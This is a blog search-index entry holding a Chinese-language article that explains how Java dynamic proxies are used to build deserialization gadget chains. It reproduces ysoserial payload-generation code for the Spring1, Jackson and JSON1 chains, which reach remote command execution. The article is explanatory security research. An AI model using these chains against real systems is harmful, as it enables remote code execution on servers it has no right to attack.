<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>动态代理在java反序列化中的应用</title>
    <url>/archives/42eb2c82.html</url>
    <content><![CDATA[<h1 id="动态代理在Java反序列化中的应用"><a href="#动态代理在Java反序列化中的应用" class="headerlink" title="动态代理在Java反序列化中的应用"></a>动态代理在Java反序列化中的应用</h1><h2 id="动态代理简介"><a href="#动态代理简介" class="headerlink" title="动态代理简介"></a>动态代理简介</h2><p>何为代理？在日常生活中我们或多或少都接触过房产中介、4S店以及各种各样的代理商，他们在经济社会运行当中扮演着代理的角色，负责对接厂商与客户。<br>用户如果想要投诉产品、寻求赔偿等，可以统一找到代理商，由代理商向厂商提出，这样便极大的节约了用户的各方面成本。<br>在编程中所谓的代理模式也是同样的道理，当我们想要对某一个类进行功能扩展而又不想直接修改当前类的代码的时候，我们可以创建一个代理类来对目标类进行包装。<br>通过在当前类的运行前、运行后、运行异常时添加新的代码从而实现目标类功能的增强与拓展。这便是代理模式的运行。如下图，A表示被代理类，B表示代理类，当A没有被代理时，外界的其他方法可以直接调用A的方法，<br>当A被代理后，C的方法如果要想调用A的方法就需要先通过B类再由B类调用A类的方法，那么我们便可以在B类中增加一些其他的功能。B类此时就类似一个收保护费的，要想从此过，留下买路钱，正所谓漫天要价，坐地还钱。<br><img src="/archives/42eb2c82/003.png"><br>代理按照代理类创建的时间节点不同又可分为静态代理与动态代理，所谓静态代理即对每一个被代理类均创建一个对应的代理类以代理其功能并按照需要进行扩展，这样就面临一个困境，即如果有很多的需要被代理的类，<br> 那么就需要手动创建对应数量的代理类，这无疑增加了工作量与管理复杂度。<br>当目标类逐渐在增多时，对应的代理类数量随之扩张。<br><img src="/archives/42eb2c82/004.png"><br> 而动态代理则能很好地屏蔽这个缺陷，动态代理通过代理接口类实现了代理类的运行时动态生成，无论存在多少被代理类，<br>只要他们实现了相关的接口便可以动态地进行代理类的生成。<br>当使用动态代理时，无论由多少个目标类A B D … 只需保证他们都实现了统一接口SA，则只需代理SA接口一次即可对所有的目标类进行统一的管理。<br><img src="/archives/42eb2c82/005.png"><br>在 <code>JAVA</code> 中，动态代理的实现主要依赖于 <code>Proxy</code> 类以及相应的 <code>InvocationHandler</code> 实现，<code>Proxy</code> 类负责代理类的生成，<code>InvocationHandler</code> 接口负责目标方法的功能扩展。<br>动态代理实现目标类功能扩展的核心在于<code>InvocationHandler</code>，用户通过自定义<code>InvocationHandler</code>可以实现统一的日志管理，状态检查以及其他更高级的功能，如在本文中将会提及的修改方法返回对象、屏蔽方法调用异常、进行方法调用分流等。  </p>
<span id="more"></span>
<h2 id="动态代理的应用"><a href="#动态代理的应用" class="headerlink" title="动态代理的应用"></a>动态代理的应用</h2><p>在<code>JAVA</code>原生反序列化漏洞的利用过程中，最困难的不在于寻找可控输入的<code>readObject</code>方法调用，而在于寻找一条可用的反序列化调用链。<br>在寻找反序列化利用链的过程中，可能会遇到如下几个问题：</p>
<ul>
<li>找到了可以进行反射方法调用的地方但是只能调用特定类型的方法；</li>
<li>找到了能够调用某个类的所有<code>getter</code>的方法但是方法调用顺序是随机的，某些方法的调用会产生异常导致程序退出。</li>
</ul>
<p>这些问题都能利用动态代理代理类的特性或者<code>InvocationHandler</code>实现的功能解决。  </p>
<h3 id="修改方法返回对象"><a href="#修改方法返回对象" class="headerlink" title="修改方法返回对象"></a>修改方法返回对象</h3><p>使用 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 可以修改被代理类方法的返回值，其 <code>invoke</code> 方法实现如下。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">        Class[] var5 = var2.getParameterTypes();</span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var5.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (var4) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.toStringImpl();</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.hashCodeImpl();</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);</span><br><span class="line">                    <span class="keyword">if</span> (var6 == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(<span class="built_in">this</span>.type, var4);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                            var6 = <span class="built_in">this</span>.cloneArray(var6);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> var6;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在上面 <code>invoke</code> 方法的实现中，最终的返回值为<code>var6</code>，而<code>var6</code>来自于<code>memberValues</code>对象<code>get</code>方法的调用，<code>memberValues</code>是一个<code>Map</code>对象，其值在<code>AnnotationInvocationHandler</code>实例化的过程中被赋予，即该值是可控的。<br><code>memberValues</code>对象在取值时其<code>key</code>为<code>var4</code> ，为被调用方法的方法名，即其值是已知的。又因<code>invoke</code>方法的返回值为<code>Object</code>类型，故<code>invoke</code>方法的返回值可以被修改为用户控制的任意对象。<br><code>AnnotationInvocationHandler</code>的这一特性在 <code>Spring1</code> 链中有所体现。<code>Spring1</code>链是在<code>Spring</code>框架中发现的一条反序列化利用链，其能达成远程命令执行的效果。<br>下面是 <code>ysoserial</code> 工具创建<code>Spring1</code>链的代码。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="comment">// [0]</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">		<span class="comment">// [1]</span></span><br><span class="line">        <span class="type">ObjectFactory</span> <span class="variable">objectFactoryProxy</span> <span class="operator">=</span> (ObjectFactory)Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="string">&quot;getObject&quot;</span>, templates), ObjectFactory.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">		<span class="comment">// [2]</span></span><br><span class="line">        <span class="type">Type</span> <span class="variable">typeTemplatesProxy</span> <span class="operator">=</span> (Type)Gadgets.createProxy((InvocationHandler)Reflections.getFirstCtor(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>).newInstance(objectFactoryProxy), Type.class, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;);</span><br><span class="line">		<span class="comment">// [3]</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">typeProviderProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="string">&quot;getType&quot;</span>, typeTemplatesProxy), Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>), <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">		<span class="comment">// [4]</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">mitpCtor</span> <span class="operator">=</span> Reflections.getFirstCtor(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">		<span class="comment">// [5]</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">mitp</span> <span class="operator">=</span> mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod(<span class="string">&quot;getClass&quot;</span>), <span class="number">0</span>);</span><br><span class="line">		<span class="comment">// [6]</span></span><br><span class="line">        Reflections.setFieldValue(mitp, <span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">		<span class="comment">// [7]</span></span><br><span class="line">        <span class="keyword">return</span> mitp;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在上面的代码中，如果将[1]到[7]看作序列化的过程，那么从[7]到[1]就是反序列化的过程。<br>动态代理发挥作用的过程使用下面的图片进行说明。<br><img src="/archives/42eb2c82/006.png">  </p>
<p>在反序列化的过程中首先被调用的是<code>SerializableTypeWrapper$MethodInvokeTypeProvider</code>的 <code>readObject</code> 方法  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream inputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            inputStream.defaultReadObject();</span><br><span class="line">			<span class="comment">// [8]</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ReflectionUtils.findMethod(<span class="built_in">this</span>.provider.getType().getClass(), <span class="built_in">this</span>.methodName);</span><br><span class="line">			<span class="comment">// [9]</span></span><br><span class="line">            <span class="built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="built_in">this</span>.provider.getType());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在标记[9]的地方<code>invokeMethod</code>方法被调用，通过反射进行无参方法调用，参数<code>method</code>为<code>Method</code>对象，<code>this.provider.getType()</code>则用于指定调用方法所属对象。<br>众所周知，<code>TemplatesImpl</code>类的<code>newTransformer</code>方法是一个常用的反序列化链片段，刚好该方法是一个无参方法。 所以如果<code>method</code>刚好是<code>newTransformer</code>方法，<code>this.provider.getType()</code>刚好返回<code>TemplatesImpl</code>对象就恰到好处了。<br><code>method</code>来自于标记[8]的方法调用。这也是一个反射方法调用，所以只需要在构造<code>SerializableTypeWrapper$MethodInvokeTypeProvider</code>对象时设置<code>methodName</code>属性为<code>newTransformer</code>即可。<br>调用方法的问题解决了，还需要调用对象的配合，调用对象来自于<code>this.provider.getType()</code>的配合，<code>this.provider</code>是一个<code>TypeProvider</code>类型，观察其<code>getType</code>方法的签名发现该方法返回值类型为<code>Type</code>类型，与所需的<code>TemplatesImpl</code>类型不匹配。<br>一般情况下路走到这里就走到死胡同了，不过通过签名提到的<code>AnnotationInvocationHandler</code>的特性我们可以将这个死胡同打穿形成一条新的路。<br><code>AnnotationInvocationHandler</code>的<code>invoke</code>方法调用可以修改被代理方法的返回值，所以可以创建一个代理类代理 <code>SerializableTypeWrapper$TypeProvider</code>类，将<code>TemplatesImpl</code>对象以方法名<code>getType</code>为<code>key</code>放到<code>AnnotationInvocationHandler</code>的<code>memberValues</code>对象中。<br>这便是本节标记[3]处代码的意义。<br>到了这里似乎就可以结束了，但是前面忽略了一点就是<code>getType</code>本身是返回<code>Type</code>类型的，虽然替换了返回结果为<code>TemplatesImpl</code>满足了反序列化链的需求，但是<code>TemplatesImpl</code>本身并不实现<code>Type</code>接口。<br>那么便可以继续生成一个代理类让其同时实现<code>Type</code>以及<code>Templates</code>接口，这便是本节标记[2]处代码的意义。<br><code>AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code>的<code>invoke</code>方法是这样的。其会从<code>ObjectFactory</code> 属性中通过<code>getObject方</code>法 获取目标对象，若要使得<code>getObject</code>方法返回<code>TemplatesImpl</code> 对象，<br>则需要再次使用<code>AnnotationInvocationHandler</code>代理<code>ObjectFactory</code>。 这就是本节标记[1]处代码的意义。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">            <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;equals&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> proxy == args[<span class="number">0</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> System.identityHashCode(proxy);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.objectFactory.toString();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.objectFactory.getObject(), args);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> var6.getTargetException();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>通过上面的分析可知，在<code>Spring1</code> 链中，多次使用了<code>AnnotationInvocationHandler</code>可以修改方法调用的放回值的特性利用动态代理机制完成反序列化利用链片段的连接。<br>当然，<code>AnnotationInvocationHandler</code>的使用并不是没有限制的。 首先我们从上面<code>Spring1</code>链的分析中得知 <code>AnnotationInvocationHandler</code>的<code>invoke</code>方法在调用完成后返回被修改后的对象，<br>该对象要保证能够被接受的变量所兼容，即需要保证接收变量为该返回值的父类型，在<code>Spring1</code>的例子中invokeMethod的方法签名的第二个参数用于接收修改后的对象，恰好其为<code>Object</code>类型为所有类型的父类型所以并没有发生异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">invokeMethod</span><span class="params">(Method method, Object target)</span></span><br></pre></td></tr></table></figure>
<p>而在代理<code>getType</code>方法时，因为<code>getType</code>方法本身接收的响应类型为<code>Type</code>类型，而我们希望响应<code>TemplatesImpl</code>类型，所以需要额外借助<code>AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code>再创建一个代理类同时代理<code>Type</code>以及<code>Templates</code>类型以达到目的。<br>所以当<code>AnnotationInvocationHandler</code>被用作替换对象类型的时候往往不是单独使用的，其往往需要其他代理类来代理特定的类型以避免类型转换异常。  </p>
<h3 id="无关方法调用屏蔽"><a href="#无关方法调用屏蔽" class="headerlink" title="无关方法调用屏蔽"></a>无关方法调用屏蔽</h3><p><code>Jackson</code>是<code>JAVA</code>中使用广泛的一个处理<code>JSON</code>字符串的工具包，在<code>Jackson</code>的代码中存在一条完成的<code>JAVA</code>反序列化利用链。该链在实际使用过程中偶尔会执行错误导致不能成功进行命令执行，<br>这源于该链执行过程中使用的<code>TemplatesImpl</code>对象的<code>getOutputProperties</code>方法调用不稳定，当 <code>getStylesheetDOM</code> 先于<code>getOutputProperties</code>被调用时将导致反序列化失败。<br>在实践中我们发现当这出现这种情况时，无论你重新尝试多少次都不会再成功执行，除非目标系统重启。<br>失败的原因在于<code>getStylesheetDOM</code>方法调用时<code>_sdom</code>的值为空，又因为<code>_sdom</code>是一个被<code>transient</code>修饰的瞬态变量并不参与<code>JAVA</code>原生的序列化与反序列化。<br>为了解决这一问题，在<code>Jackson</code>链的实践中使用了动态代理的特性：<strong>使用反射获取一个代理类上的所有方法时，只能获取到其代理的接口方法</strong>。<br>具体的操作方法是创建目标类的代理类，代理其某一个接口，如果该接口定义了我们希望调用的方法而没有定义其他的不被希望调用的方法，那么在通过反射获取代理类的方法时只能获取到被代理接口中定义的方法。<br>下面图片简要总结了<code>Jackson</code>链调用过程以及增加动态代理后程序的执行逻辑。<br><img src="/archives/42eb2c82/007.png"><br>以下代码是<code>ysoserial</code>中生成<code>Jackson</code>链<code>Payload</code>的代码。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="comment">// [0]</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass.removeMethod(writeReplace);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line">		<span class="comment">// [1]</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">		<span class="comment">// [2]</span></span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(templates);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);</span><br><span class="line">		<span class="comment">// [3]</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxy);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(val, <span class="string">&quot;val&quot;</span>, node);</span><br><span class="line">		<span class="comment">// [4]</span></span><br><span class="line">        <span class="type">byte</span>[] serialize = Serializer.serialize(val);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialize);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在标记代码块[3]中使用了<code>BadAttributeValueExpException</code> 作为反序列化的起始点，<code>BadAttributeValueExpException</code>是一个比较常用的类，其<code>readObject</code>方法调用会触发<code>val</code>属性值的<code>toString</code>方法。<br>将<code>val</code>设置为一个<code>POJONode</code>对象，其<code>toString</code>方法定义在父类<code>BaseJsonNode</code>方法中。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> InternalNodeMapper.nodeToString(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>nodeToString</code>方法将调用<code>STD_WRITTER</code>的<code>writeValueAsString</code>方法，该方法在调用过程中会通过反射的方式尝试获取<code>POJONode</code>方法实例化时传入参数对象的所有<code>getter</code>方法，然后按照获取顺序依次调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">nodeToString</span><span class="params">(BaseJsonNode n)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> STD_WRITER.writeValueAsString(_wrapper(n));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(var2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>getter</code>方法的获取顺序是随机的并且会被缓存机制缓存，当<code>StylesheetDOM</code>的获取在<code>OutputProperties</code>之前时便会因为<code>_sdom</code>为空导致程序异常退出。<br><img src="/archives/42eb2c82/001.png"><br>为了处理这个问题使用了<code>JdkDynamicAopProxy</code>代理<code>Templates</code>接口创建代理类，代理类在通过反射获取方法时只能获取到被代理接口中定义的方法，如此便可以屏蔽掉<code>getStylesheetDOM</code>方法，这便是标记代码块[2]处代码的意义。  </p>
<h3 id="方法调用分流"><a href="#方法调用分流" class="headerlink" title="方法调用分流"></a>方法调用分流</h3><p>如上一节通过代理接口屏蔽无关方法调用从而屏蔽异常的方式有严格的限制，需要满足恰好被代理接口定义了我们需要的目标方法且没有定义一些其他的可能对结果产生干扰的方法，这种情况往往可遇不可求。本节将提供另外一种对方法调用异常进行屏蔽的方法。<br><code>CompositeInvocationHandlerImpl</code>能够对方法调用异常进行屏蔽的核心在于其能根据方法名对方法的调用进行分流，对于在调用过程中会导致异常的方法通过<code>AnnotationInvocationHandler</code>直接替换掉响应结果即可屏蔽可能导致异常的过程调用。<br>具体的实现方法是通过将可能导致异常的方法所属类作为<code>key</code>，将<code>AnnotationInvocationHandler</code>作为<code>value</code>放到一个<code>Map</code>中，当方法调用时首先尝试从这个<code>Map</code>中获取对应的<code>handler</code>再使用该<code>handler</code>进行实际的方法调用。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">( Object proxy, Method method, Object[] args )</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> method.getDeclaringClass() ;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span></span><br><span class="line">            (InvocationHandler)classToInvocationHandler.get( cls ) ;</span><br><span class="line">        <span class="keyword">if</span> (handler == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (defaultHandler != <span class="literal">null</span>)</span><br><span class="line">                handler = defaultHandler ;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">ORBUtilSystemException</span> <span class="variable">wrapper</span> <span class="operator">=</span> ORBUtilSystemException.get(</span><br><span class="line">                    CORBALogDomains.UTIL ) ;</span><br><span class="line">                <span class="keyword">throw</span> wrapper.noInvocationHandler( <span class="string">&quot;\&quot;&quot;</span> + method.toString() +</span><br><span class="line">                    <span class="string">&quot;\&quot;&quot;</span> ) ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> handler.invoke( proxy, method, args ) ;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>json-lib</code>同样是用来处理<code>JSON</code>字符串的<code>Java</code>工具包，其中也存在一条反序列化利用链，这条链被成为<code>JSON1</code>。<br>在<code>JSON1</code>链中便使用了方法调用分流方式来屏蔽<code>getCompositeType</code>方法调用导致的异常。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">makeCallerChain</span><span class="params">(Object payload, Class... ifaces)</span> <span class="keyword">throws</span> OpenDataException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, Exception, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">CompositeType</span> <span class="variable">rt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CompositeType</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;a&quot;</span>&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;a&quot;</span>&#125;, <span class="keyword">new</span> <span class="title class_">OpenType</span>[]&#123;SimpleType.INTEGER&#125;);</span><br><span class="line">        <span class="type">TabularType</span> <span class="variable">tt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TabularType</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, rt, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;a&quot;</span>&#125;);</span><br><span class="line">        <span class="type">TabularDataSupport</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TabularDataSupport</span>(tt);</span><br><span class="line">        <span class="type">TabularDataSupport</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TabularDataSupport</span>(tt);</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">as</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        as.setTarget(payload);</span><br><span class="line">		<span class="comment">// [1]</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">delegateInvocationHandler</span> <span class="operator">=</span> (InvocationHandler)Reflections.newInstance(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;as&#125;);</span><br><span class="line">		<span class="comment">// [2]</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">cdsInvocationHandler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(Gadgets.createMap(<span class="string">&quot;getCompositeType&quot;</span>, rt));</span><br><span class="line">		<span class="comment">// [3]</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler)Reflections.newInstance(<span class="string">&quot;com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        ((Map)Reflections.getFieldValue(invocationHandler, <span class="string">&quot;classToInvocationHandler&quot;</span>)).put(CompositeData.class, cdsInvocationHandler);</span><br><span class="line">        Reflections.setFieldValue(invocationHandler, <span class="string">&quot;defaultHandler&quot;</span>, delegateInvocationHandler);</span><br><span class="line">		<span class="comment">// [4]</span></span><br><span class="line">        <span class="type">CompositeData</span> <span class="variable">cdsProxy</span> <span class="operator">=</span> (CompositeData)Gadgets.createProxy(invocationHandler, CompositeData.class, ifaces);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        m.put(<span class="string">&quot;t&quot;</span>, cdsProxy);</span><br><span class="line">		<span class="comment">// [5]</span></span><br><span class="line">        Reflections.setFieldValue(jo, <span class="string">&quot;properties&quot;</span>, m);</span><br><span class="line">        Reflections.setFieldValue(jo, <span class="string">&quot;properties&quot;</span>, m);</span><br><span class="line">        Reflections.setFieldValue(t1, <span class="string">&quot;dataMap&quot;</span>, jo);</span><br><span class="line">        Reflections.setFieldValue(t2, <span class="string">&quot;dataMap&quot;</span>, jo);</span><br><span class="line">		<span class="comment">// [6]</span></span><br><span class="line">        <span class="keyword">return</span> Gadgets.makeMap(t1, t2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>JSON1</code>在反序列化的过程中会触发<code>getCompositeType</code>方法并产生异常，故使用<code>CompositeInvocationHandlerImpl</code>对<code>CompositeData</code>类中的<code>getter</code>进行分流处理，使用<code>AnnotationInvocationHandler</code>直接响应有效对象避免调用过程中的异常。<br>而对于需要调用的目标方法（TemplatesImpl的getOutputProperties方法）则使用<code>JdkDynamicAopProxy</code>代理进行简单的反射方法调用即可。<br><code>JSON1</code>链的简要调用流程图下。<br><img src="/archives/42eb2c82/009.png">  </p>
